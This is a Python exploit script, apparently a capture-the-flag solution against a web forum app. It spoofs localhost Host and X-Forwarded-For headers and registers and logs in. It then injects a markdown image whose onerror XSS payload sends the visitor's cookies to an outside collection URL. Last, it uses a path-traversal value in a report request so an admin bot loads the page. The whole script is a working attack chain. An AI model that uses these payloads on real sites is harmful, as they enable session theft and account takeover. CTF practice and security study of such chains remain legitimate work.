#!/usr/bin/python3
import sys
import requests
import string
import random

url = f'http://{sys.argv[1]}'
reflect_url = sys.argv[2] #ngrok or postbin

dbg = True
def log_debug(*args):
    if dbg:
        print('[dbg]', *args)

ses = requests.Session()

cache_headers = {'Host': '127.0.0.1:1337', 'X-Forwarded-For': '127.0.0.1'}

res = ses.post(f'{url}/api/register', headers = cache_headers, 
    data = {'username': 'kek', 'password': 'uwu'})
log_debug(res)

res = ses.post(f'{url}/api/login', headers = cache_headers, 
    data = {'username': 'kek', 'password': 'uwu'})
log_debug(res, res.cookies.get_dict())

xss_script = f"document.location='{reflect_url}/?c='+document.cookie;"
xss_markdown = f'![Uh oh...]("onerror="{xss_script})'
log_debug(xss_markdown)

res = ses.post(f'{url}/threads/preview', headers = cache_headers,
    params = {'cache': ''.join(random.choice(string.digits) for _ in range(5))},
    data = { 'title': 'pepega', 'content': xss_markdown, 'cat_id': '2'})
log_debug(res, res.url)

xss_urldir = res.request.path_url

res = ses.post(f'{url}/api/report', headers = cache_headers,
    data ={'post_id': f'..{xss_urldir}'})
log_debug(res, res.request.body)

#intercept request at reflect_url, base64 decode cookie, get flag
